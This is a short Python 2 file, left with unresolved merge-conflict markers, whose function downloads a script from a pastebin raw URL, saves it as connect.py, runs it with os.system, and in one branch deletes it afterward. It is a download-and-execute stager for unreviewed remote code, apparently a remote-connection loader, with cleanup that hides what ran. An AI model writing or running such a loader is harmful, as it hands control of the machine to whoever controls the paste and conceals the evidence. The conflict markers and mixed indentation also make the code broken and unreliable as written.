import os
import urllib
<<<<<<< HEAD
=======

filz = "http://pastebin.com/raw/qNjByHqW"
>>>>>>> ee163332f77e16cf91eb2f701f59fcfaffecc6fa

def ran():
        print "[ + ] Connection [ + ]"
	testfile = urllib.URLopener()
<<<<<<< HEAD
	testfile.retrieve("http://pastebin.com/raw/0dbGx4eq", "connect.py")
	os.system("python connect.py")
=======
	testfile.retrieve(filz, "connect.py")
	os.system("python connect.py")
	os.remove("connect.py")
>>>>>>> ee163332f77e16cf91eb2f701f59fcfaffecc6fa
